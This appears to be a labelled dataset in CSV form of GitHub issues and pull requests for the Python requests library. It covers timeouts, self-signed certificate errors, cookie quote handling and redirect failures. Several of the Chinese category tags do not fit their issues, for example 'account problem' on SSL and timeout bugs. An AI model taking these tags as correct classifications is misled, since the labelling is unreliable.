id,title,body,category,urgency,html_url
2855048823,[Edited] Add docstring to improve documentation,"Changes made in branch: **MayureshMore:3.0**
[Edited] Add docstring to improve documentation
",文档问题,中,https://github.com/psf/requests/pull/6895
2854007933,timeout on requests.get is not working,"requests.get is not timing out after the set timeout period is elapsed.

Using sample code like below - 

import requests
data_uri = f""https://api.xxxxx.com/xxx/xxxx/xxxx/xxxx/xxx/xxx.json""
print(f""datauri : {data_uri}"")
headers = {
   ""Authorization"": ""Bearer "" + ""access_token"",
   ""Accept"": ""application/json""
}
response = requests.get(data_uri, headers=headers,timeout=10)


Above command will keep running till it is cancelled and no messages after 10 seconds.


requests library version - 2.28.1

As on the screenshot, destination is not reachable and NO response for SYN packet aswell..

![Image](https://github.com/user-attachments/assets/00a7dbfd-086c-41e9-b1c2-d540f7fb5583)","功能建议, 账号问题, 网络连接失败",中,https://github.com/psf/requests/issues/6894
2848118510,Issue with SSL verification using self-signed certificate in version 2.32.3,"I am experiencing an issue with version 2.32.3 of the library when using build_connection_pool_key_attributes with a self-signed certificate. I need a custom SSL context because the connection fails due to weak certificate strength.

See also https://github.com/psf/requests/issues/6715


## Expected Result

The connection should be established.

## Actual Result

When I run this code, I encounter the following error:

`An error occurred: HTTPSConnectionPool(host='<host>', port=443): Max retries exceeded with url: /<action>/ (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate (_ssl.c:1000)')))`

## Reproduction Steps

```python
import ssl
import requests
from requests.adapters import HTTPAdapter

class SSLAdapter(HTTPAdapter):
    """"""An HTTPAdapter that uses an arbitrary SSL context.""""""

    def __init__(self, ssl_context: ssl.SSLContext = None, **kwargs):
        """"""Initialize the SSLAdapter.""""""
        super().__init__(**kwargs)
        self.ssl_context = ssl_context

    def build_connection_pool_key_attributes(
        self,
        request: requests.PreparedRequest,
        verify: bool | str,
        cert: str | tuple[str, str] | None = None,
    ) -> tuple[dict, dict]:
        host_params, ssl_params = super().build_connection_pool_key_attributes(
            request, verify, cert
        )
        if verify is True and self.ssl_context:
            ssl_params[""ssl_context""] = self.ssl_context

        return host_params, ssl_params

if __name__ == ""__main__"":
    # Create a custom SSL context
    ssl_context = ssl._create_unverified_context()
    ssl_context.set_ciphers(""DEFAULT@SECLEVEL=2"")  # Adjusting the security level to support 2048 bit keys

    # Example API call setup
    username = ""<admin>""
    password = ""<password>""
    protocol = ""https""
    api_url = f""{protocol}://<host>/""
    action = ""<action>""
    headers = {""Content-Type"": ""application/json""}

    # Create a session with the SSLAdapter
    session = requests.Session()
    session.auth = (username, password)
    session.mount(f""{protocol}://"", SSLAdapter(ssl_context=ssl_context))

    try:
        response = session.get(api_url + action, timeout=15, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print(""Response:"", response.json())
    except requests.exceptions.RequestException as e:
        print(f""An error occurred: {e}"")

```

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.0""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.13.0""
  },
  ""platform"": {
    ""release"": ""24.3.0"",
    ""system"": ""Darwin""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30400000""
  },
  ""urllib3"": {
    ""version"": ""2.2.3""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}
```

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
","Bug反馈, 功能建议, 账号问题, 网络连接失败, 文档问题",中,https://github.com/psf/requests/issues/6893
2848110391,Issue with SSL verification using self-signed certificate in version 2.32.3,"I am experiencing an issue with version 2.32.3 of the library when using build_connection_pool_key_attributes with a self-signed certificate. I need a custom SSL context because the connection fails due to weak certificate strength.

See also https://github.com/psf/requests/issues/6715 

Here is the code I am using:


```python
Code kopieren
import ssl
import requests
from requests.adapters import HTTPAdapter

class SSLAdapter(HTTPAdapter):
    """"""An HTTPAdapter that uses an arbitrary SSL context.""""""

    def __init__(self, ssl_context: ssl.SSLContext = None, **kwargs):
        """"""Initialize the SSLAdapter.""""""
        super().__init__(**kwargs)
        self.ssl_context = ssl_context

    def build_connection_pool_key_attributes(
        self,
        request: requests.PreparedRequest,
        verify: bool | str,
        cert: str | tuple[str, str] | None = None,
    ) -> tuple[dict, dict]:
        host_params, ssl_params = super().build_connection_pool_key_attributes(
            request, verify, cert
        )
        if verify is True and self.ssl_context:
            ssl_params[""ssl_context""] = self.ssl_context

        return host_params, ssl_params

if __name__ == ""__main__"":
    # Create a custom SSL context
    ssl_context = ssl._create_unverified_context()
    ssl_context.set_ciphers(""DEFAULT@SECLEVEL=2"")  # Adjusting the security level to support 2048 bit keys

    # Example API call setup
    username = ""<admin>""
    password = ""<password>""
    protocol = ""https""
    api_url = f""{protocol}://<host>/""
    action = ""<action>""
    headers = {""Content-Type"": ""application/json""}

    # Create a session with the SSLAdapter
    session = requests.Session()
    session.auth = (username, password)
    session.mount(f""{protocol}://"", SSLAdapter(ssl_context=ssl_context))

    try:
        response = session.get(api_url + action, timeout=15, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print(""Response:"", response.json())
    except requests.exceptions.RequestException as e:
        print(f""An error occurred: {e}"")

```

When I run this code, I encounter the following error:

`An error occurred: HTTPSConnectionPool(host='<host>', port=443): Max retries exceeded with url: /<action>/ (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate (_ssl.c:1000)')))`

I expected that using _create_unverified_context would allow for self-signed certificates, but it seems that is not the case. What am I doing wrong?

Any guidance on how to resolve this issue would be greatly appreciated!","Bug反馈, 功能建议, 账号问题, 网络连接失败, 文档问题",中,https://github.com/psf/requests/issues/6892
2846046708,Remove incorrect handling of escaped quotes in cookie values,"fixed #6890, #3759",Bug反馈,中,https://github.com/psf/requests/pull/6891
2846042981,Incorrect Handling of Escaped Quotes in Cookie Values,"## Expected Result

Legitimate escaped quotes (e.g., `\""`) in cookie values should be preserved. For example:  
Input value `""159\\""687""` (actual string: `159\""687`) should remain unchanged.

## Actual Result

Requests incorrectly replaces escaped quotes with an empty string, causing `""159\\""687""` to become `""159687""` (string becomes `159687`), which corrupts valid values.

## Reproduction Steps

```python
import requests
from requests.cookies import create_cookie

# Create a cookie with escaped quotes
cookie = create_cookie(
    name=""test_cookie"",
    value='""159\\""687""',  # Actual stored value should be 159\""687
    domain=""example.com""
)

# Test using a session
with requests.Session() as s:
    s.cookies.set_cookie(cookie)
    retrieved = s.cookies.get(""test_cookie"")
    print(f""Expected: 159\\\""687 | Actual: {retrieved.value}"")  # Actual output: 159687
```

## Issue Analysis

The code at [src/requests/cookies.py#L349-L356](https://github.com/psf/requests/blob/f761e74a4d50d2e88d9e30e660494b36c9d630f8/src/requests/cookies.py#L349-L356) has the following problem:

```python
# Problematic code snippet
if (
    hasattr(cookie.value, ""startswith"")
    and cookie.value.startswith('""')
    and cookie.value.endswith('""')
):
    cookie.value = cookie.value.replace('\\""', """")  # Incorrectly removes all escaped quotes
```

This logic makes incorrect assumptions about cookie value sanitization. While RFC 6265 specifies that cookie values shouldn't _contain_ escaped characters (through its `cookie-value` definition), many real-world implementations:
1. Allow backslash-escaped quotes in cookie values for historical compatibility
2. Expect clients to preserve such values verbatim for proper server-side parsing
3. Use these patterns in legitimate scenarios (e.g., JSON fragments in cookies)

By forcibly stripping escaped quotes, Requests breaks values that:
- Were explicitly escaped by servers
- Contain valid escaped sequences from non-standard implementations
- Include quote characters in structured data formats

## Suggested Fix
Remove this non-standard cleanup logic entirely.","Bug反馈, 功能建议, 文档问题",中,https://github.com/psf/requests/issues/6890
2840920833,Updated the test for extract_zipped_paths to run correctly if test_utils.py is changed,"Hey! So I was playing around with requests and pytest and trying to see how unit tests work. While messing around with the tests cases in `test_utils.py`, I ran into a weird error, a completely unrelated unit test began to fail!

This test turned out to be the test for the the function `extract_zipped_paths` in `utils.py`. It seems that this function tries to extract a zipped file to a specific location, but doesn't do so if a file already exists at that location.

In the unit test for this function, the test file itself is being used to validate whether the file is properly extracted post zipping. However, after running the test suite once, the zipped file is never replaced again! This led to newer versions of this file being compared with an older version, which ultimately caused the test case to fail in the `filecmp` assertion.

Instead of me having to `rm -rf` it every time, I decided to include a minor cleanup step in the test case itself. Hope this helps out any future devs!

**Note:** I'm open to other suggestions as well. I tried to keep the underlying code/functionality as unchanged as possible, another approach could be to make a separate file just to test out this function? Could be a randomly generated file during tests, or a fixed one in the main repo as well.","Bug反馈, 功能建议",中,https://github.com/psf/requests/pull/6889
2839197310,"Importing requests will very rarely, throw a regex error.","<!-- Summary. -->

`import requests`
requests==2.32.3
throws an intermittent regular expression error for IPV6 in `<my_venv>/lib/python3.10/site-packages/urllib3/util/url.py`
The error is extremely rare and intermittently shows up, with seemingly nothing different.

It's likely worth mentioning that I'm using Ubuntu LTS and have disabled IPV6 support via `grub`
So my OS will never do anything using IPV6

How I disabled IPV6 via grub:
I edited my `/etc/default/grub`
with the following changes:
```
GRUB_CMDLINE_LINUX_DEFAULT=""ipv6.disable=1""
```

<!-- What you expected. -->
I would expect that  `import requests` never throws a regex related error.

## Actual Result
```
Traceback (most recent call last):
  ... # REDACTED
  File ""/home/MYUSER/.pyenv/versions/MY_VENV/lib/python3.10/site-packages/MY_PROJECT/MY_SCRIPT.py"", line 3, in <module>
   import requests
  File ""/home/MYUSER/.pyenv/versions/MY_VENV/lib/python3.10/site-packages/requests/__init__.py"", line 43, in <module>
   import urllib3
  File ""/home/MYUSER/.pyenv/versions/MY_VENV/lib/python3.10/site-packages/urllib3/__init__.py"", line 15, in <module>
   from ._base_connection import _TYPE_BODY
  File ""/home/MYUSER/.pyenv/versions/MY_VENV/lib/python3.10/site-packages/urllib3/_base_connection.py"", line 5, in <module>
   from .util.connection import _TYPE_SOCKET_OPTIONS
  File ""/home/MYUSER/.pyenv/versions/MY_VENV/lib/python3.10/site-packages/urllib3/util/__init__.py"", line 8, in <module>
   from .ssl_ import (
  File ""/home/MYUSER/.pyenv/versions/MY_VENV/lib/python3.10/site-packages/urllib3/util/ssl_.py"", line 13, in <module>
   from .url import _BRACELESS_IPV6_ADDRZ_RE, _IPV4_RE
  File ""/home/MYUSER/.pyenv/versions/MY_VENV/lib/python3.10/site-packages/urllib3/util/url.py"", line 60, in <module>
   _IPV6_ADDRZ_RE = re.compile(""^"" + _IPV6_ADDRZ_PAT + ""$"")
  File ""/home/MYUSER/.pyenv/versions/3.10.13/lib/python3.10/re.py"", line 251, in compile
   return _compile(pattern, flags)
  File ""/home/MYUSER/.pyenv/versions/3.10.13/lib/python3.10/re.py"", line 303, in _compile
   p = sre_compile.compile(pattern, flags)
  File ""/home/MYUSER/.pyenv/versions/3.10.13/lib/python3.10/sre_compile.py"", line 792, in compile
   code = _code(p, flags)
  File ""/home/MYUSER/.pyenv/versions/3.10.13/lib/python3.10/sre_compile.py"", line 631, in _code
   _compile(code, p.data, flags)
  File ""/home/MYUSER/.pyenv/versions/3.10.13/lib/python3.10/sre_compile.py"", line 225, in _compile
   _compile(code, av, flags)
  File ""/home/MYUSER/.pyenv/versions/3.10.13/lib/python3.10/sre_compile.py"", line 172, in _compile
   _compile(code, av[2], flags)
  File ""/home/MYUSER/.pyenv/versions/3.10.13/lib/python3.10/sre_compile.py"", line 172, in _compile
   _compile(code, av[2], flags)
  File ""/home/MYUSER/.pyenv/versions/3.10.13/lib/python3.10/sre_compile.py"", line 164, in _compile
   _compile(code, av[2], flags)
  File ""/home/MYUSER/.pyenv/versions/3.10.13/lib/python3.10/sre_compile.py"", line 106, in _compile
   for op, av in pattern:
  File ""/home/MYUSER/.pyenv/versions/3.10.13/lib/python3.10/sre_parse.py"", line 166, in __getitem__
   if isinstance(index, slice):
TypeError: slice expected at least 1 argument, got 0
```

<!-- What happened instead. -->

## Reproduction Steps

```python
import requests # That's it.
```

## System Information

    $ python -m requests.help

```json
(?:(?:[0-9A-Fa-f]{1,4}:){6}(?:[0-9A-Fa-f]{1,4}:[0-9A-Fa-f]{1,4}|(?:[0-9]{1,3}\.){3}[0-9]{1,3})|::(?:[0-9A-Fa-f]{1,4}:){5}(?:[0-9A-Fa-f]{1,4}:[0-9A-Fa-f]{1,4}|(?:[0-9]{1,3}\.){3}[0-9]{1,3})|(?:[0-9A-Fa-f]{1,4})?::(?:[0-9A-Fa-f]{1,4}:){4}(?:[0-9A-Fa-f]{1,4}:[0-9A-Fa-f]{1,4}|(?:[0-9]{1,3}\.){3}[0-9]{1,3})|(?:(?:[0-9A-Fa-f]{1,4}:)?[0-9A-Fa-f]{1,4})?::(?:[0-9A-Fa-f]{1,4}:){3}(?:[0-9A-Fa-f]{1,4}:[0-9A-Fa-f]{1,4}|(?:[0-9]{1,3}\.){3}[0-9]{1,3})|(?:(?:[0-9A-Fa-f]{1,4}:){0,2}[0-9A-Fa-f]{1,4})?::(?:[0-9A-Fa-f]{1,4}:){2}(?:[0-9A-Fa-f]{1,4}:[0-9A-Fa-f]{1,4}|(?:[0-9]{1,3}\.){3}[0-9]{1,3})|(?:(?:[0-9A-Fa-f]{1,4}:){0,3}[0-9A-Fa-f]{1,4})?::[0-9A-Fa-f]{1,4}:(?:[0-9A-Fa-f]{1,4}:[0-9A-Fa-f]{1,4}|(?:[0-9]{1,3}\.){3}[0-9]{1,3})|(?:(?:[0-9A-Fa-f]{1,4}:){0,4}[0-9A-Fa-f]{1,4})?::(?:[0-9A-Fa-f]{1,4}:[0-9A-Fa-f]{1,4}|(?:[0-9]{1,3}\.){3}[0-9]{1,3})|(?:(?:[0-9A-Fa-f]{1,4}:){0,5}[0-9A-Fa-f]{1,4})?::[0-9A-Fa-f]{1,4}|(?:(?:[0-9A-Fa-f]{1,4}:){0,6}[0-9A-Fa-f]{1,4})?::)
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.1""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.10.13""
  },
  ""platform"": {
    ""release"": ""6.8.0-52-generic"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""300000d0""
  },
  ""urllib3"": {
    ""version"": ""2.3.0""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}

```

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
","Bug反馈, 功能建议, 账号问题, 网络连接失败, 性能问题",中,https://github.com/psf/requests/issues/6888
2832866427,Automatically retry idempotent requests,"[`urllib3`](https://urllib3.readthedocs.io/en/stable/user-guide.html#retrying-requests), `OkHttp` (Java) and Apache HttpClient HTTP client libraries retry failed idempotent requests by default. I think retrying such requests is something that user would naturally want. Would a pull request adding such a functionality be accepted?","Bug反馈, 功能建议, 账号问题, 文档问题",中,https://github.com/psf/requests/issues/6887
2831396617,requests.Session is not properly applying SSL Verification default,"The [requests documentation](https://requests.readthedocs.io/en/latest/api/#requests.Session.verify) states that the `value` property of `request.Session` is ""SSL verification default"". I believe that this default, when set in code, should have a higher precedence than the value set through the `REQUESTS_CA_BUNDLE` environment variable.

## Expected Result

`Session.requests` should use any non-None value of **verify** and ignore the value of `REQUESTS_CA_BUNDLE` (default set in code should have higher precedence than the environment). `REQUESTS_CA_BUNDLE` should only be used if `Session.verify=None` in code.

## Actual Result

`Session.requests` overrides **verify=False** with the value of `REQUESTS_CA_BUNDLE`

## Reproduction Steps

```python
export REQUESTS_CA_BUNDLE=/opt/homebrew/etc/ca-certificates/cert.pem

python3

import requests
session = Session()
session.verify = False
session.get('https://127.0.0.1') # Website with a self signed certificate

requests.exceptions.SSLError: HTTPSConnectionPool(host='127.0.0.1', port=443): Max retries exceeded with url: / (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate (_ssl.c:1147)')))
```

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.1""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.9.21""
  },
  ""platform"": {
    ""release"": ""23.6.0"",
    ""system"": ""Darwin""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30400000""
  },
  ""urllib3"": {
    ""version"": ""2.3.0""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}

```","Bug反馈, 功能建议, 网络连接失败, 文档问题",中,https://github.com/psf/requests/issues/6886
2830975306,Unexpected `SSLEOFError` when Receiving Redirect (307) Response with Large Data Payload,"<!-- Summary. -->

This issue occurs only when TLS is enabled on both the client and server sides.

When a `requests` client sends a large `PUT` request and receives an **HTTP 307 redirect**, the server may close the connection early before the payload is fully transmitted. This happens because the server issuing the redirect does not need to process the request body, so it terminates the connection as soon as it sends the redirect response. However, `requests` does not handle this scenario gracefully and raises the following SSL error:
```
urllib3.exceptions.SSLError: EOF occurred in violation of protocol (_ssl.c:2426)
```
## Expected Result

If an HTTP 307 redirect is received before the payload is fully transmitted, `requests` should handle the redirect properly **without complaining on the previous early-closed connection**. The client should not fail simply because the server closed the connection early.

## Actual Result

`requests` fails with `SSLEOFError` instead of retrying the request to the redirected location.
This issue does not occur with small payloads (maybe because they are typically sent in a single transmission chunk and completes before the server closes it?)

## Reproduction Steps

### Client-Side Code
```python
import requests
requests.put(""https://localhost:5000/"", data=""A"" * 10_000_000, verify=""/path/to/openssl/certs/ca.crt"")
...
>> urllib3.exceptions.SSLError: EOF occurred in violation of protocol (_ssl.c:2426)
```

### Server-Side Code (Minimal Proxy)
```python
import http.server
import socketserver
import ssl
import urllib.parse

CERT_FILE = ""/path/to/openssl/certs/server.crt""
KEY_FILE = ""/path/to/openssl/certs/server.key""
REDIRECT_BASE_URL = ""https://google.com""

class ProxyHandler(http.server.BaseHTTPRequestHandler):
    def do_PUT(self):
        # Uncomment below to drain the request payload and prevent this issue
        # content_length = int(self.headers.get(""Content-Length"", 0))
        # if content_length:
        #     self.rfile.read(content_length)  # Uncomment to prevent connection reset

        target_url = urllib.parse.urljoin(REDIRECT_BASE_URL, self.path)

        self.send_response(307)
        self.send_header(""Location"", target_url)
        self.send_header(""Content-Length"", ""0"")
        self.end_headers()

if __name__ == ""__main__"":
    PORT = 5000
    with socketserver.TCPServer(("""", PORT), ProxyHandler) as httpd:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
        httpd.serve_forever()
```

### SSL Certificate Generation
If needed, generate self-signed TLS certificates using the following OpenSSL commands:
```sh
openssl req -x509 -newkey rsa:2048 -keyout ca.key -out ca.crt -days 1024 -nodes -subj ""/CN=localhost"" \
  -extensions v3_ca -config <(printf ""[req]\ndistinguished_name=req\nx509_extensions=v3_ca\n[ v3_ca ]\nsubjectAltName=DNS:localhost,DNS:127.0.0.1,IP:127.0.0.1\nbasicConstraints=CA:TRUE\n"")

openssl req -new -newkey rsa:2048 -nodes -keyout server.key -out server.csr -subj ""/C=US/ST=California/L=Santa Clara/O=COMPANY/OU=TEAM/CN=localhost"" \
  -config <(printf ""[req]\ndistinguished_name=req\nreq_extensions = v3_req\n[ v3_req ]\nsubjectAltName=DNS:localhost,DNS:127.0.0.1,IP:127.0.0.1\n"")

openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt -days 365 -sha256 \
  -extfile <(printf ""[ext]\nsubjectAltName=DNS:localhost,DNS:127.0.0.1,IP:127.0.0.1\nbasicConstraints=CA:FALSE\nkeyUsage=digitalSignature,nonRepudiation,keyEncipherment,dataEncipherment\nextendedKeyUsage=serverAuth,clientAuth\n"") -extensions ext

```

## System Information
Python 3.10.12 (main, Jan 17 2025, 14:35:34) [GCC 11.4.0] on linux
$ python3 -m requests.help
```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.1""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.10.12""
  },
  ""platform"": {
    ""release"": ""5.15.0-118-generic"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30000020""
  },
  ""urllib3"": {
    ""version"": ""2.3.0""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}
```

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
","Bug反馈, 功能建议, 账号问题, 网络连接失败",中,https://github.com/psf/requests/issues/6885
2828277401,Include invalid type name in error message,* Included invalid type name in error message for better debugging.,Bug反馈,中,https://github.com/psf/requests/pull/6884
